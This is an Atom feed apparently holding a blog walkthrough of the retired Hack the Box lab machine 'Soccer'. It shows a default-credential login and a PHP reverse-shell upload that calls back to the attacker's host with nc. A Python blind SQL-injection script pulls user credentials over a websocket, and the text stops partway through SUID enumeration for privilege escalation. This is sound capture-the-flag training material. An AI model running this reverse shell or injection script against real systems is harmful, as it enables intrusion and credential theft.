@@ -1,0 +1,1280 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://blog.anotherplacein.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://blog.anotherplacein.com/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-06-11T11:59:20+00:00</updated><id>https://blog.anotherplacein.com/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design.
+</subtitle><entry><title type="html">Soccer</title><link href="https://blog.anotherplacein.com/blog/2023/soccer/" rel="alternate" type="text/html" title="Soccer" /><published>2023-06-06T15:09:00+00:00</published><updated>2023-06-06T15:09:00+00:00</updated><id>https://blog.anotherplacein.com/blog/2023/soccer</id><content type="html" xml:base="https://blog.anotherplacein.com/blog/2023/soccer/"><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>Hack the Box is one of the cybersecurity upskilling platforms I use for professional development. Roughly once a week, Hack the Box releases a new vulnerable box for users to hack. Additionally, one active box is retired every week. Below is a walkthrough on compromising the recently retired box, “Soccer.”</p>
+
+<h2 id="summary">Summary</h2>
+<p><a href="https://hackthebox.com/machines/soccer">Soccer Hack The Box</a></p>
+
+<p>Soccer is hosting a website that exposes a website admin login page still configured with default credentials. Once I log in, I am able to upload a PHP file, granting me RCE (Remote Code Execution) on the box. While enumerating the box, I come across a new subdomain of the website. Upon exploring the subdomain, I discover a blind, boolean-based SQL injection vulnerability, which I exploit to obtain the user’s credentials. Logged in as a user, I find that “doas” is configured to allow me to run “dstat”. This configuration enables me to obtain a root shell.</p>
+
+<h2 id="port-scanning">Port Scanning</h2>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds TCP ports 22, 80 and 9091 open.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>nmap 10.10.11.194                                                                                                                                             
+<span class="go">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 13:49 EDT
+Nmap scan report for 10.10.11.194
+Host is up (0.027s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9091/tcp open  xmltec-xmlmail</span></code></pre></figure>
+
+<h2 id="enumerating-port-80">Enumerating port 80</h2>
+<h3 id="web-browser">Web Browser</h3>
+<p>Navigating to <code class="language-plaintext highlighter-rouge">http://10.10.11.194</code> I am redirected to soccer.htb.  I add soccer.htb to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and reload the page. I find the “HTB FootBall Club.”</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>Looking around the website doesn’t give any interesting results.</p>
+
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<p>I use <code class="language-plaintext highlighter-rouge">gobuster</code> and the word list <code class="language-plaintext highlighter-rouge">directory-list-2.3-small.txt</code> to discover the directory tiny.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer/httpsoccer.htb]
+</span><span class="gp">└─$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://soccer.htb/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+<span class="go">===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://soccer.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/06/18 14:20:40 Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="gp">/tiny                 (Status: 301) [Size: 178] [--&gt;</span><span class="w"> </span>http://soccer.htb/tiny/]
+<span class="go">Progress: 87591 / 87665 (99.92%)
+===============================================================
+2023/06/18 14:24:23 Finished
+===============================================================</span></code></pre></figure>
+
+<p>Visiting <code class="language-plaintext highlighter-rouge">http://soccer.htb/tiny/</code> I encounter a login screen.</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s2.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>Googling “Tiny File Manager default credentials” I find <code class="language-plaintext highlighter-rouge">admin:admin@123</code>.  I am able to login with these credentials!</p>
+
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s3.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>Looking around I discover I can upload a <code class="language-plaintext highlighter-rouge">php</code> file to the uploads directory.  This will allow me to obtain a foothold on the box.</p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>I upload the following php file to the uploads directory.  I then navigate to the file I uploaded to initiate my reverse shell.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 9595&gt;/tmp/f'</span><span class="p">)</span><span class="cp">?&gt;</span></code></pre></figure>
+
+<div class="row mt-3">
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s5.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 9595
+<span class="go">listening on [any] 9595 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.11.194] 59412
+</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+<span class="gp">www-data@soccer:~/html/tiny/uploads$</span><span class="w"> </span>^Z
+<span class="go">zsh: suspended  nc -lvnp 9595
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span> % 1                                                                                                                                                                                                          148 ⨯ 1 ⚙
+<span class="go">[1]  + continued  nc -lvnp 9595
+                               export TERM=screen
+</span><span class="gp">www-data@soccer:~/html/tiny/uploads$</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">www-data
+</span><span class="gp">www-data@soccer:~/html/tiny/uploads$</span></code></pre></figure>
+
+<h2 id="user">User</h2>
+<p>From here I ran <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230618-1fa055b6">linpeas</a>.  Looking through the output of linpease I noticed the subdomain <code class="language-plaintext highlighter-rouge">soc-player</code> in <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">www-data@soccer:~/html/tiny/uploads$</span><span class="w"> </span><span class="nb">cat</span> /etc/hosts
+<span class="go">127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb
+
+127.0.1.1       ubuntu-focal    ubuntu-focal</span></code></pre></figure>
+
+<p>Adding <code class="language-plaintext highlighter-rouge">soc-player.soccer.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and navigating to the subdomain in my browser, I find a page similar to “HTB FootBall Club,” but with a Signup page.</p>
+
+<p>I sign up for an account.</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s6.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>Signing in with the account I created, I am able to check for valid tickets.</p>
+
+<div class="row mt-3">
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s7.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s8.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>Looking at the traffic in burp, I see that this feature is being accomplished using a websocket.  Now I see why this box is called soccer and not football!</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s9.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>With a little help from <code class="language-plaintext highlighter-rouge">python's</code> websocket library we are able to discover a boolean based blind SQL injection.</p>
+
+<p><code class="language-plaintext highlighter-rouge">test.py</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="n">websocket</span><span class="p">,</span> <span class="n">json</span>
+
+<span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="p">.</span><span class="nc">WebSocket</span><span class="p">()</span>
+<span class="n">ws</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="sh">"</span><span class="s">ws://soc-player.soccer.htb:9091</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">}</span>  <span class="c1"># Normal data
+</span><span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 or 1=1</span><span class="sh">"</span><span class="p">}</span> <span class="c1"># Injecting boolean logic 
+</span><span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></code></pre></figure>
+
+<p>Running the above code I see that I am able to inject sql logic.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 test.py
+<span class="go">Ticket Doesn't Exist
+Ticket Exists</span></code></pre></figure>
+
+<p>Using <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#identifying-back-end">HackTricks SQL-Injection Identifying Back-End</a> I determine that the backend is likely “MYSQL.”  I am going to take a moment here to explain how I can use this boolean injection to enumerate the database.</p>
+
+<p>Looking at this example, if the database begins with the letter a.  Then the result would be “Ticket Exists”.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 UNION SELECT 1,2,3 WHERE database() like </span><span class="sh">'</span><span class="s">a%</span><span class="sh">'"</span><span class="p">}</span> <span class="c1"># Checking to see if the database begins with the letter a
+</span><span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></code></pre></figure>
+
+<p>Running the above code we see “Ticket Doesn’t Exists.”  This tells us that our above statements is false and therefore the database does not start with the letter a.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 test.py
+<span class="go">Ticket Doesn't Exist</span></code></pre></figure>
+
+<p>However, If we check if the database starts with the letter s, we receive “Ticket Exists.”</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 UNION SELECT 1,2,3 WHERE database() like </span><span class="sh">'</span><span class="s">s%</span><span class="sh">'"</span><span class="p">}</span> <span class="c1"># Checking to see if the database begins with the letter s
+</span><span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 test.py
+<span class="go">Ticket Exists</span></code></pre></figure>
+
+<p>Now that I know that the first letter of the database is s, I can loop through the alphabet to find the second letter.  If I did this I would find the second letter is “o.”</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 UNION SELECT 1,2,3 WHERE database() like </span><span class="sh">'</span><span class="s">so%</span><span class="sh">'"</span><span class="p">}</span> <span class="c1"># Checking to see if the database begins with the letters "so"
+</span><span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 test.py
+<span class="go">Ticket Exists</span></code></pre></figure>
+
+<p>Rather than doing this manually, I wrote a python script to automate this enumeration.</p>
+
+<p><code class="language-plaintext highlighter-rouge">soccer_sqli.py</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="n">websocket</span><span class="p">,</span><span class="n">json</span><span class="p">,</span> <span class="n">sys</span>
+<span class="sh">"""</span><span class="s">
+Example Usage
+
+python3 soccer_sqli.py </span><span class="sh">"</span><span class="s">WHERE database() like </span><span class="sh">'</span><span class="s">__loop__%</span><span class="sh">'"</span><span class="s"> f
+
+</span><span class="sh">"""</span>
+
+<span class="n">alpha_b</span> <span class="o">=</span> <span class="sh">"</span><span class="s">q w e r t y u i o p a s d f g h j k l z x c v b n m 0 1 2 3 4 5 6 7 8 9 _ -</span><span class="sh">"</span>
+<span class="n">alpha_b_list</span> <span class="o">=</span> <span class="n">alpha_b</span><span class="p">.</span><span class="nf">split</span><span class="p">()</span>
+<span class="n">ALPHA_B</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Q W E R T Y U I O P A S D F G H J K L Z X C V B N M q w e r t y u i o p a s d f g h j k l z x c v b n m 0 1 2 3 4 5 6 7 8 9 ! @ # $ ^ &amp; * ( ) ? &gt; &lt; , . [ ] { } _ -</span><span class="sh">"</span>
+<span class="n">ALPHA_B_LIST</span> <span class="o">=</span> <span class="n">ALPHA_B</span><span class="p">.</span><span class="nf">split</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">get_from_db</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">replacement_text</span><span class="p">,</span> <span class="n">full_list</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">payload</span><span class="p">[</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">__replace__</span><span class="sh">"</span><span class="p">,</span> <span class="n">replacement_text</span><span class="p">)</span>
+    <span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="p">.</span><span class="nc">WebSocket</span><span class="p">()</span>
+    <span class="n">ws</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="sh">"</span><span class="s">ws://soc-player.soccer.htb:9091</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">end_of_word</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">this_word</span> <span class="o">=</span> <span class="sh">""</span>
+    <span class="k">if</span> <span class="n">full_list</span><span class="p">:</span>
+        <span class="n">letter_list</span> <span class="o">=</span> <span class="n">ALPHA_B_LIST</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">letter_list</span> <span class="o">=</span> <span class="n">alpha_b_list</span>
+
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">end_of_word</span><span class="p">:</span>
+        <span class="n">end_of_word</span> <span class="o">=</span> <span class="bp">True</span>        
+        <span class="n">found_letter</span><span class="o">=</span><span class="bp">False</span>
+        <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">letter_list</span><span class="p">:</span>
+            <span class="n">current_word</span> <span class="o">=</span> <span class="n">this_word</span> <span class="o">+</span> <span class="n">letter</span>
+            
+            
+            <span class="n">d</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="n">payload</span><span class="p">[</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">__loop__</span><span class="sh">'</span><span class="p">,</span> <span class="n">current_word</span><span class="p">)}</span>
+
+            <span class="n">data</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">d</span><span class="p">))</span>
+            <span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+            
+            <span class="k">if</span> <span class="n">result</span> <span class="o">==</span><span class="sh">"</span><span class="s">Ticket Exists</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">found_letter</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+                <span class="n">this_word</span> <span class="o">=</span> <span class="n">this_word</span> <span class="o">+</span> <span class="n">letter</span>
+                <span class="n">found_letter</span> <span class="o">=</span> <span class="bp">True</span>
+                <span class="n">end_of_word</span> <span class="o">=</span> <span class="bp">False</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">this_word</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">this_word</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">1 UNION SELECT 1,2,3 __replace__-- -</span><span class="sh">"</span><span class="p">}</span>
+
+<span class="n">inject</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">lower</span><span class="p">()</span> <span class="o">==</span><span class="sh">'</span><span class="s">t</span><span class="sh">'</span><span class="p">:</span>
+    <span class="nf">get_from_db</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">inject</span><span class="p">,</span> <span class="n">full_list</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="nf">get_from_db</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">inject</span><span class="p">)</span></code></pre></figure>
+
+<p>First I get the name of the database I am currently working in.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"WHERE database() like '__loop__%'"</span> f
+<span class="go">s
+so
+soc
+socc
+socce
+soccer
+soccer_
+soccer_d
+soccer_db</span></code></pre></figure>
+
+<p>Now I use my script to look for tables in soccer_db.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.tables where table_schema = 'soccer_db' and table_name like '__loop__%'"</span> f
+<span class="go">a
+ac
+acc
+acco
+accou
+accoun
+account
+accounts
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.tables where table_schema = 'soccer_db' and table_name like '__loop__%' and table_name != 'accounts'"</span> f
+<span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span></code></pre></figure>
+
+<p>I find only one table <code class="language-plaintext highlighter-rouge">accounts</code>.  Now I can find the columns in that table.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.COLUMNS where table_schema = 'soccer_db' and table_name='accounts' and COLUMN_NAME like '__loop__%'"</span> f 
+<span class="go">e
+em
+ema
+emai
+email
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.COLUMNS where table_schema = 'soccer_db' and table_name='accounts' and COLUMN_NAME like '__loop__%' and COLUMN_NAME != 'email'"</span> f
+<span class="go">u
+us
+use
+user
+usern
+userna
+usernam
+username
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.COLUMNS where table_schema = 'soccer_db' and table_name='accounts' and COLUMN_NAME like '__loop__%' and COLUMN_NAME != 'email' and COLUMN_NAME != 'username'"</span> f
+<span class="go">i
+id
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.COLUMNS where table_schema = 'soccer_db' and table_name='accounts' and COLUMN_NAME like '__loop__%' and COLUMN_NAME != 'email' and COLUMN_NAME != 'username' and COLUMN_NAME != 'id'"</span> f
+<span class="go">p
+pa
+pas
+pass
+passw
+passwo
+passwor
+password
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.COLUMNS where table_schema = 'soccer_db' and table_name='accounts' and COLUMN_NAME like '__loop__%' and COLUMN_NAME != 'email' and COLUMN_NAME != 'username' and COLUMN_NAME != 'id' and COLUMN_NAME !='password'"</span> f</code></pre></figure>
+
+<p>Now I can extract data out of the username and password columns.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM accounts where username like '__loop__%'"</span> f                        
+<span class="go">p
+pl
+pla
+play
+playe
+player
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM accounts where username like '__loop__%' and username != 'player'"</span> f 
+<span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM accounts where password like BINARY '__loop__%'"</span> t         
+<span class="go">P
+Pl
+Pla
+Play
+Playe
+Player
+PlayerO
+PlayerOf
+PlayerOft
+PlayerOfth
+PlayerOfthe
+PlayerOftheM
+PlayerOftheMa
+PlayerOftheMat
+PlayerOftheMatc
+PlayerOftheMatch
+PlayerOftheMatch2
+PlayerOftheMatch20
+PlayerOftheMatch202
+PlayerOftheMatch2022</span></code></pre></figure>
+
+<p>I have now discovered the credentials <code class="language-plaintext highlighter-rouge">player:PlayerOftheMatch2022</code>.  I ssh in as player and obtain the <code class="language-plaintext highlighter-rouge">user.txt</code> flag.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>ssh player@10.10.11.194         
+<span class="go">player@10.10.11.194's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Jun 19 19:53:12 UTC 2023
+
+  System load:           0.0
+  Usage of /:            70.1% of 3.84GB
+  Memory usage:          20%
+  Swap usage:            0%
+  Processes:             230
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.194
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:63eb
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
+</span><span class="gp">player@soccer:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt |wc
+<span class="go">      1       1      33</span></code></pre></figure>
+
+<h2 id="root">Root</h2>
+<p>Looking at which applications have the SUID bit set I discover an unsual one, <code class="language-plaintext highlighter-rouge">doas</code></p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">player@soccer:~$</span><span class="w"> </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+<span class="go">/usr/local/bin/doas
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/at
+/snap/snapd/17883/usr/lib/snapd/snap-confine
+/snap/core20/1695/usr/bin/chfn
+/snap/core20/1695/usr/bin/chsh
